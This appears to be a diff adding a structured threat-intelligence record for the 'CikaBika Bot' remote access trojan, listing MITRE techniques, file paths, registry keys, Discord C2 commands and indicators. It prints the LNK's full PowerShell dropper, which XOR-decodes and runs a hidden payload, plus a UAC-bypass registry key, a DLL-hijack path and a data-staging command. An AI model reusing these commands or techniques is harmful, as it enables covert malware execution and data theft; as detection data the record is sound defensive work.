@@ -1,0 +1,211 @@
+{
+  "malware_family": "CikaBika Bot",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "CikaBika Bot is a Rust-based Remote Access Trojan (RAT) delivered via a phishing lure containing a disk image with a malicious LNK file. A Nim-based loader uses a UAC bypass and DLL search-order hijacking against Microsoft Edge to deploy the RAT. The malware uses Discord for command-and-control, allowing operators to perform reconnaissance, execute commands, and exfiltrate data.",
+  "mitre_techniques": [
+    "T1204.002",
+    "T1036.007",
+    "T1059.001",
+    "T1027",
+    "T1140",
+    "T1548.002",
+    "T1112",
+    "T1574.001",
+    "T1036.005",
+    "T1082",
+    "T1016",
+    "T1057",
+    "T1113",
+    "T1059.003",
+    "T1102.002",
+    "T1560.001",
+    "T1567",
+    "T1070.004",
+    "T1218.010",
+    "T1005",
+    "T1074.001",
+    "T1041",
+    "T1564.003",
+    "T1027.013"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_name",
+      "value": "Proposition_Projet_Personnalisable.docx.lnk",
+      "context": "Malicious shortcut disguised as a Word document inside disk image.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Presentation_Generale.pdf.pdf",
+      "context": "Decoy PDF document containing an embedded, XOR-encoded payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell.exe -windowstyle hidden -command \"&{$f='Proposition_Projet_Personnalisable.docx';$p='Presentation_Generale.pdf.pdf';Start-Process $p -WindowStyle Normal;$x=239;$k=([System.IO.File]::ReadAllBytes($p))[$x];$b=([System.IO.File]::ReadAllBytes($p))|ForEach-Object{$_ -bxor $k};$o=\\\"$env:TEMP\\IfyuUapz.txt\\\";[System.IO.File]::WriteAllBytes($o, $b);cmd /c $o}\"",
+      "context": "Command embedded in malicious LNK file to decode and execute payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\IfyuUapz.txt",
+      "context": "File path for the executed Nim-based loader payload.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\dbghelp.dll",
+      "context": "Malicious RAT DLL planted to hijack search order of msedge.exe.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\dbghelp.tmp",
+      "context": "Staging location for the malicious DLL before UAC bypass.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
+      "context": "Registry key modified to perform a UAC bypass.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "tasklist_startup.txt",
+      "context": "Output file from initial process enumeration reconnaissance.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "network_info.txt",
+      "context": "Output file from initial network configuration reconnaissance.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "screenshot.png",
+      "context": "Output file from initial screenshot capture.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!shell",
+      "context": "Discord C2 command for remote command execution.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!sysinfo",
+      "context": "Discord C2 command to retrieve host details.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!download",
+      "context": "Discord C2 command to retrieve a file from the victim.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!src",
+      "context": "Discord C2 command handler string for screenshots.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "powershell -c Compress-Archive -Path <REDACTED> -DestinationPath \"C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\<REDACTED>.zip\"",
+      "context": "Command sent via Discord to stage data for exfiltration.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "import_name",
+      "value": "ShowWindow",
+      "context": "WinAPI function called by C# helper to hide UAC bypass windows.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "ipify.com",
+      "context": "Used during device registration to retrieve the victim's public IP address.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "script"
+  ]
+}
